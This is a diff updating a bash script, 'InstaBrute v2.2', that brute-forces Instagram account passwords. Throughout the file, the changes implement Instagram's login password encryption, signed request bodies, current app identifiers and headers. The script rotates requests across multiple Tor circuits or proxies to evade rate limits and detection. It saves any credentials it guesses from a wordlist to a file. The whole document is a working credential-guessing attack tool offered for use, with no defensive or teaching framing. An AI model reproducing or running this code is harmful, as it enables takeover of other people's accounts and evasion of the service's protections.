@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Instagram: @Nakul_thakur_42
-# InstaBrute v2.1 - Advanced Instagram Brute Forcer
+# InstaBrute v2.2 - Advanced Instagram Brute Forcer
 
 trap 'store;exit 1' 2
 
@@ -33,9 +33,11 @@ TOR_PORTS=(9051 9052 9053 9054 9055)
 TOR_DIRS=("/var/lib/tor1" "/var/lib/tor2" "/var/lib/tor3" "/var/lib/tor4" "/var/lib/tor5")
 # ========================================================
 
-ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
-useragent='Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)'
+ig_sig="46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b"
+app_id="567067343352427"
+useragent='Instagram 428.0.0.47.67 Android (34/14; 480dpi; 1344x2992; Google/google; Pixel 8 Pro; husky; husky; en_US; 961145276)'
 backoff=0
+BLOKS_VERSIONING_ID="7189b949425f9bf80ea8bd880cf5a3080b292d9b1c4b38a18d112f7c4b71e7a8"
 
 checkroot() {
     if [[ "$(id -u)" -ne 0 ]]; then
@@ -71,9 +73,126 @@ banner() {
     printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ |  _____   \e[0m\n"
     printf "\e[1;77m    |_||_| |_|(___/    \__)\_____| (_____)  \e[0m\n"
     printf "\n"
-    printf "\e[1;77m\e[45m   Instagram Brute Forcer v 2.1 Author: Nakul_thakur_42   \e[0m\n"
+    printf "\e[1;77m\e[45m   Instagram Brute Forcer v 2.2 Author: Nakul_thakur_42   \e[0m\n"
     printf "\e[1;77m\e[45m   Multi-Tor | Multi-Threaded | Anti-Detection            \e[0m\n"
     printf "\n"
+}
+
+generate_jazoest() {
+    local symbols="$1"
+    local amount=0
+    local i
+    for (( i=0; i<${#symbols}; i++ )); do
+        printf -v val "%d" "'${symbols:$i:1}"
+        amount=$((amount + val))
+    done
+    echo "2${amount}"
+}
+
+encrypt_password() {
+    local password="$1"
+    local key_id_pubkey="$2"
+    local key_id="${key_id_pubkey%%|*}"
+    local pubkey_b64="${key_id_pubkey#*|}"
+
+    local timestamp
+    timestamp=$(date +%s)
+
+    # Generate random 32-byte session key and 12-byte IV
+    local session_key_hex
+    session_key_hex=$(openssl rand -hex 32)
+    local iv_hex
+    iv_hex=$(openssl rand -hex 12)
+
+    # Convert password to hex
+    local plaintext_hex
+    plaintext_hex=$(printf '%s' "$password" | xxd -p | tr -d '\n')
+
+    # Convert base64 public key to PEM format for RSA encryption
+    local der_hex
+    der_hex=$(printf '%s' "$pubkey_b64" | base64 -d 2>/dev/null | xxd -p | tr -d '\n')
+    local pem_header="30820122300d06092a864886f70d01010105000382010f00"
+    local pem_footer="0382010a00"
+    local pem_content="${pem_header}${der_hex}${pem_footer}"
+    local pem_body
+    pem_body=$(printf '%s' "$pem_content" | xxd -r -p | base64 | tr -d '\n' | fold -w 64)
+    local rsa_pubkey_pem
+    rsa_pubkey_pem="-----BEGIN PUBLIC KEY-----\n${pem_body}\n-----END PUBLIC KEY-----"
+
+    # RSA encrypt the session key using the public key
+    local rsa_encrypted_hex
+    rsa_encrypted_hex=$(printf '%s' "$session_key_hex" | xxd -r -p | \
+        openssl pkeyutl -encrypt -pubin -pkeyopt rsa_padding_mode:pkcs1 \
+        -inkey <(printf '%b' "$rsa_pubkey_pem") 2>/dev/null | xxd -p | tr -d '\n')
+    local rsa_size=${#rsa_encrypted_hex}
+    rsa_size=$((rsa_size / 2))
+
+    # AES-GCM encrypt the password with the session key
+    local aes_ciphertext
+    aes_ciphertext=$(printf '%s' "$plaintext_hex" | openssl enc -aes-256-gcm \
+        -K "$session_key_hex" \
+        -iv "$iv_hex" \
+        -aad "$(printf '%s' "$timestamp" | xxd -p | tr -d '\n')" \
+        -nosalt 2>/dev/null | xxd -p | tr -d '\n')
+
+    # AES-GCM appends the 16-byte tag at the end
+    local tag_hex="${aes_ciphertext: -32}"
+    local encrypted_body="${aes_ciphertext:0:${#aes_ciphertext}-32}"
+
+    # Build payload: 0x01 + key_id(1) + IV(12) + rsa_size(2) + rsa_encrypted + tag(16) + aes_ciphertext
+    local payload
+    payload="01"
+    payload="${payload}$(printf '%02x' "$key_id")"
+    payload="${payload}${iv_hex}"
+    payload="${payload}$(printf '%04x' "$rsa_size" | sed 's/\(..\)\(..\)/\2\1/')"
+    payload="${payload}${rsa_encrypted_hex}"
+    payload="${payload}${tag_hex}"
+    payload="${payload}${encrypted_body}"
+
+    # Base64 encode and format
+    printf '#PWD_INSTAGRAM:4:%s:%s' "$timestamp" "$(printf '%s' "$payload" | xxd -r -p | base64 | tr -d '\n')"
+}
+
+fetch_public_key() {
+    local response
+    if [[ "$MODE" == "tor" ]]; then
+        response=$(curl --socks5 "127.0.0.1:${WORKING_PORTS[0]}" -s -H "User-Agent: $useragent" \
+            -H "X-IG-App-ID: $app_id" \
+            "https://i.instagram.com/api/v1/qe/sync/" 2>/dev/null)
+    elif [[ "$MODE" == "proxy" ]]; then
+        response=$(curl --socks5 "$PROXY" -s -H "User-Agent: $useragent" \
+            -H "X-IG-App-ID: $app_id" \
+            "https://i.instagram.com/api/v1/qe/sync/" 2>/dev/null)
+    else
+        response=$(curl -s -H "User-Agent: $useragent" \
+            -H "X-IG-App-ID: $app_id" \
+            "https://i.instagram.com/api/v1/qe/sync/" 2>/dev/null)
+    fi
+
+    local key_id
+    local pubkey
+    key_id=$(printf '%s' "$response" | grep -oi "ig-set-password-encryption-key-id" | head -1)
+    pubkey=$(printf '%s' "$response" | grep -oi "ig-set-password-encryption-pub-key" | head -1)
+
+    if [[ -n "$key_id" && -n "$pubkey" ]]; then
+        key_id=$(printf '%s' "$response" | sed -n 's/.*ig-set-password-encryption-key-id: \([0-9]*\).*/\1/p' | head -1)
+        pubkey=$(printf '%s' "$response" | sed -n 's/.*ig-set-password-encryption-pub-key: \(.*\)/\1/p' | head -1 | tr -d '\r')
+        echo "${key_id}|${pubkey}"
+    else
+        local headers
+        headers=$(printf '%s' "$response")
+        key_id=$(printf '%s' "$headers" | grep -i "ig-set-password-encryption-key-id" | head -1 | awk '{print $2}' | tr -d '\r')
+        pubkey=$(printf '%s' "$headers" | grep -i "ig-set-password-encryption-pub-key" | head -1 | sed 's/.*: //' | tr -d '\r')
+        if [[ -n "$key_id" && -n "$pubkey" ]]; then
+            echo "${key_id}|${pubkey}"
+        else
+            printf "\e[1;91m[!] Failed to fetch encryption keys\e[0m\n"
+            if [[ "$DEBUG" -eq 1 ]]; then
+                printf "\e[1;93m[DEBUG] Key fetch response:\n%s\e[0m\n" "$response"
+            fi
+            return 1
+        fi
+    fi
 }
 
 function start() {
@@ -114,6 +233,19 @@ function start() {
         echo "$var" > debug_csrf.log
     fi
     printf "\e[1;92m[*] CSRF Token: \e[0m\e[1;77m%s\e[0m\n" "$var2"
+
+    printf "\e[1;92m[*] Fetching encryption keys...\e[0m\n"
+    pub_key_data=$(fetch_public_key)
+    if [[ -z "$pub_key_data" ]]; then
+        printf "\e[1;91m[!] Could not fetch encryption keys. Aborting.\e[0m\n"
+        exit 1
+    fi
+    pub_key_id="${pub_key_data%%|*}"
+    pub_key_val="${pub_key_data#*|}"
+    printf "\e[1;92m[*] Encryption key ID: \e[0m\e[1;77m%s\e[0m\n" "$pub_key_id"
+
+    adid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || openssl rand -hex 16 | sed 's/\(.\{8\}\)/\1-/g;s/-$//')
+    printf "\e[1;92m[*] Ad ID: \e[0m\e[1;77m%s\e[0m\n" "$adid"
 }
 
 multitor() {
@@ -189,10 +321,22 @@ checkmultitor() {
 
 healthcheck() {
     printf "\e[1;92m[*] Running API health check...\e[0m\n"
-    test_data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"__HEALTHCHECK__", "login_attempt_count":"0"}'
-    test_hmac=$(echo -n "$test_data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
+    local hc_jazoest
+    hc_jazoest=$(generate_jazoest "$phone")
+    local hc_adid
+    hc_adid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || openssl rand -hex 16 | sed 's/\(.\{8\}\)/\1-/g;s/-$//')
+    test_data="{\"jazoest\":\"${hc_jazoest}\",\"country_codes\":\"[{\\\\\"country_code\\\\\":\\\\\"1\\\\\",\\\\\"source\\\\\":[\\\\\"default\\\\\"]}]\",\"phone_id\":\"${phone}\",\"enc_password\":\"#PWD_INSTAGRAM:4:0:__HEALTHCHECK__\",\"username\":\"${user}\",\"adid\":\"${hc_adid}\",\"guid\":\"${guid}\",\"device_id\":\"${device}\",\"google_tokens\":\"[]\",\"login_attempt_count\":\"0\"}"
+    test_hmac=$(printf '%s' "$test_data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
 
-    curl_args=(-d "ig_sig_key_version=4&signed_body=$test_hmac.$test_data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent")
+    curl_args=(-d "ig_sig_key_version=4&signed_body=${test_hmac}.${test_data}" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" \
+        -H "Connection: close" \
+        -H "Accept: */*" \
+        -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+        -H "X-IG-App-ID: $app_id" \
+        -H "X-IG-Capabilities: 3brTv10=" \
+        -H "X-IG-Connection-Type: WIFI" \
+        -H "X-Bloks-Version-Id: $BLOKS_VERSIONING_ID" \
+        -H "User-Agent: $useragent")
 
     if [[ "$MODE" == "tor" ]]; then
         curl_args+=(--socks5 "127.0.0.1:${WORKING_PORTS[0]}")
@@ -281,9 +425,11 @@ function bruteforcer() {
             counter=1
             IFS=$'\n'
             for pass in $(sed -n "${thread_startline},${thread_endline}p" "$wl_pass"); do
-                data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
+                enc_pass=$(encrypt_password "$pass" "${pub_key_id}|${pub_key_val}")
+                jazoest=$(generate_jazoest "$phone")
+                data="{\"jazoest\":\"${jazoest}\",\"country_codes\":\"[{\\\\\"country_code\\\\\":\\\\\"1\\\\\",\\\\\"source\\\\\":[\\\\\"default\\\\\"]}]\",\"phone_id\":\"${phone}\",\"enc_password\":\"${enc_pass}\",\"username\":\"${user}\",\"adid\":\"${adid}\",\"guid\":\"${guid}\",\"device_id\":\"${device}\",\"google_tokens\":\"[]\",\"login_attempt_count\":\"0\"}"
                 countpass=$((thread_startline + counter - 1))
-                hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
+                hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
                 printf "\e[1;77m[%s] Trying pass (%s/%s)\e[0m: %s\n" "$thread_label" "$countpass" "$count_pass" "$pass"
 
                 if [[ "$MODE" == "tor" ]]; then
@@ -294,7 +440,16 @@ function bruteforcer() {
                     CURL_PROXY=""
                 fi
 
-                {(trap '' SIGINT && response=$(curl $CURL_PROXY -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
+                {(trap '' SIGINT && response=$(curl $CURL_PROXY -d "ig_sig_key_version=4&signed_body=${hmac}.${data}" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" \
+                    -H "Connection: close" \
+                    -H "Accept: */*" \
+                    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+                    -H "X-IG-App-ID: $app_id" \
+                    -H "X-IG-Capabilities: 3brTv10=" \
+                    -H "X-IG-Connection-Type: WIFI" \
+                    -H "X-Bloks-Version-Id: $BLOKS_VERSIONING_ID" \
+                    -H "User-Agent: $useragent" \
+                    "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required\|doesn't appear" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ $var == "doesn't appear" ]]; then printf "\e[1;91m  [!] Username not found, skipping: %s\e[0m\n" "$pass"; elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
                 counter=$((counter+1))
                 sleep $REQUEST_DELAY
             done
@@ -369,6 +524,18 @@ function resume() {
     printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
     count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 
+    printf "\e[1;92m[*] Fetching encryption keys...\e[0m\n"
+    pub_key_data=$(fetch_public_key)
+    if [[ -z "$pub_key_data" ]]; then
+        printf "\e[1;91m[!] Could not fetch encryption keys. Aborting.\e[0m\n"
+        exit 1
+    fi
+    pub_key_id="${pub_key_data%%|*}"
+    pub_key_val="${pub_key_data#*|}"
+    printf "\e[1;92m[*] Encryption key ID: \e[0m\e[1;77m%s\e[0m\n" "$pub_key_id"
+
+    adid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || openssl rand -hex 16 | sed 's/\(.\{8\}\)/\1-/g;s/-$//')
+
     while [ true ]; do
         changeip
 
@@ -382,9 +549,11 @@ function resume() {
             counter=1
             IFS=$'\n'
             for pass in $(sed -n "${thread_startline},${thread_endline}p" "$wl_pass"); do
-                data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
+                enc_pass=$(encrypt_password "$pass" "${pub_key_id}|${pub_key_val}")
+                jazoest=$(generate_jazoest "$phone")
+                data="{\"jazoest\":\"${jazoest}\",\"country_codes\":\"[{\\\\\"country_code\\\\\":\\\\\"1\\\\\",\\\\\"source\\\\\":[\\\\\"default\\\\\"]}]\",\"phone_id\":\"${phone}\",\"enc_password\":\"${enc_pass}\",\"username\":\"${user}\",\"adid\":\"${adid}\",\"guid\":\"${guid}\",\"device_id\":\"${device}\",\"google_tokens\":\"[]\",\"login_attempt_count\":\"0\"}"
                 countpass=$((thread_startline + counter - 1))
-                hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
+                hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
                 printf "\e[1;77m[%s] Trying pass (%s/%s)\e[0m: %s\n" "$thread_label" "$countpass" "$count_pass" "$pass"
 
                 if [[ "$MODE" == "tor" ]]; then
@@ -395,7 +564,16 @@ function resume() {
                     CURL_PROXY=""
                 fi
 
-                {(trap '' SIGINT && response=$(curl $CURL_PROXY -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
+                {(trap '' SIGINT && response=$(curl $CURL_PROXY -d "ig_sig_key_version=4&signed_body=${hmac}.${data}" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" \
+                    -H "Connection: close" \
+                    -H "Accept: */*" \
+                    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+                    -H "X-IG-App-ID: $app_id" \
+                    -H "X-IG-Capabilities: 3brTv10=" \
+                    -H "X-IG-Connection-Type: WIFI" \
+                    -H "X-Bloks-Version-Id: $BLOKS_VERSIONING_ID" \
+                    -H "User-Agent: $useragent" \
+                    "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required\|doesn't appear" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ $var == "doesn't appear" ]]; then printf "\e[1;91m  [!] Username not found, skipping: %s\e[0m\n" "$pass"; elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
                 counter=$((counter+1))
                 sleep $REQUEST_DELAY
             done
@@ -430,24 +608,47 @@ function testpassword() {
 
     healthcheck || exit 1
 
+    printf "\e[1;92m[*] Fetching encryption keys...\e[0m\n"
+    pub_key_data=$(fetch_public_key)
+    if [[ -z "$pub_key_data" ]]; then
+        printf "\e[1;91m[!] Could not fetch encryption keys. Aborting.\e[0m\n"
+        exit 1
+    fi
+    pub_key_id="${pub_key_data%%|*}"
+    pub_key_val="${pub_key_data#*|}"
+    printf "\e[1;92m[*] Encryption key ID: \e[0m\e[1;77m%s\e[0m\n" "$pub_key_id"
+
+    adid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || openssl rand -hex 16 | sed 's/\(.\{8\}\)/\1-/g;s/-$//')
+
     count_pass=$(wc -l $wl_pass | cut -d " " -f1)
     countpass=0
 
     while IFS= read -r pass; do
         countpass=$((countpass+1))
-        data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
-        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
+        enc_pass=$(encrypt_password "$pass" "${pub_key_id}|${pub_key_val}")
+        jazoest=$(generate_jazoest "$phone")
+        data="{\"jazoest\":\"${jazoest}\",\"country_codes\":\"[{\\\\\"country_code\\\\\":\\\\\"1\\\\\",\\\\\"source\\\\\":[\\\\\"default\\\\\"]}]\",\"phone_id\":\"${phone}\",\"enc_password\":\"${enc_pass}\",\"username\":\"${user}\",\"adid\":\"${adid}\",\"guid\":\"${guid}\",\"device_id\":\"${device}\",\"google_tokens\":\"[]\",\"login_attempt_count\":\"0\"}"
+        hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
 
         printf "\e[1;77m[T] Trying pass (%s/%s)\e[0m: %s " "$countpass" "$count_pass" "$pass"
 
-        curl_args=(-d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/accounts/login/")
+        curl_args=(-d "ig_sig_key_version=4&signed_body=${hmac}.${data}" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" \
+            -H "Connection: close" \
+            -H "Accept: */*" \
+            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+            -H "X-IG-App-ID: $app_id" \
+            -H "X-IG-Capabilities: 3brTv10=" \
+            -H "X-IG-Connection-Type: WIFI" \
+            -H "X-Bloks-Version-Id: $BLOKS_VERSIONING_ID" \
+            -H "User-Agent: $useragent" \
+            "https://i.instagram.com/api/v1/accounts/login/")
 
         if [[ "$MODE" == "proxy" ]]; then
             curl_args+=(--socks5 "$PROXY")
         fi
 
         response=$(curl "${curl_args[@]}")
-        var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|bad_password\|invalid_password\|Please wait" | uniq)
+        var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|bad_password\|invalid_password\|Please wait\|doesn't appear" | uniq)
 
         if [[ "$var" == "200" || "$var" == "challenge" || "$var" == "checkpoint_required" ]]; then
             printf "\e[1;92mFOUND! \e[0m\n"
@@ -457,14 +658,12 @@ function testpassword() {
             return 0
         elif [[ "$var" == "bad_password" || "$var" == "invalid_password" ]]; then
             printf "\e[1;91mwrong\e[0m\n"
+        elif [[ "$var" == "doesn't appear" ]]; then
+            printf "\e[1;91musername not found\e[0m\n"
         elif [[ "$var" == "Please wait" ]]; then
             printf "\e[1;93mrate-limited, waiting 60s...\e[0m\n"
             sleep 60
             countpass=$((countpass-1))
-            var2_old="$var2"
-            var=$(curl -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
-            var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
-            [[ -z "$var2" ]] && var2="$var2_old"
         else
             printf "\e[1;93munknown response\e[0m\n"
             if [[ "$DEBUG" -eq 1 ]]; then
